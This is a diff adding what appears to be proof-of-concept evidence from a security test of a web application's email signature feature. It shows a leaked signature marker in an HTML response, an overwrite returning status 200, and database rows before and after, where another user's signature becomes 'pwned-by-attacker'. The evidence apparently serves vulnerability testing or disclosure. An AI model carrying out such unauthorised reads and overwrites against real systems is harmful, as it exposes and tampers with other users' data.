@@ -1,0 +1,33 @@
+### READ response (PopupSignature) -- excerpt around the leaked marker ###
+2>&nbsp;</td>
+				</tr>
+				<tr>
+					<td valign="top" scope="row">
+
+							Signature:
+
+					</td>
+			        <td >
+		        		<textarea id="sigText" cols="100" rows="10" name="description">&lt;p&gt;SECRETSIG033_941ab45d&lt;/p&gt;</textarea></div>
+					</td>
+				</tr>
+			</table>
+		</td>
+	</tr>
+</table>
+</form>
+<script type="text/javascript"  src="vendor/tinymce/tinymce/tinymce.min.js?v=p-BUXW88k
+
+### OVERWRITE response status ###
+status: 200
+
+### db container verification ###
+SELECT id,user_id,name,signature_html,deleted FROM users_signatures WHERE id='d85a492e-d58c-495a-8bee-0b331ec0510c';
+
+-- BEFORE --
+id	user_id	name	signature_html	deleted
+d85a492e-d58c-495a-8bee-0b331ec0510c	b27d955a-9edd-4dc9-b0b7-aa50e26e6d66	V033Sig_d874a965	<p>SECRETSIG033_941ab45d</p>	0
+
+-- AFTER --
+id	user_id	name	signature_html	deleted
+d85a492e-d58c-495a-8bee-0b331ec0510c	b27d955a-9edd-4dc9-b0b7-aa50e26e6d66	pwned-by-attacker	<p>PWNEDSIG033_440c7048</p>	0
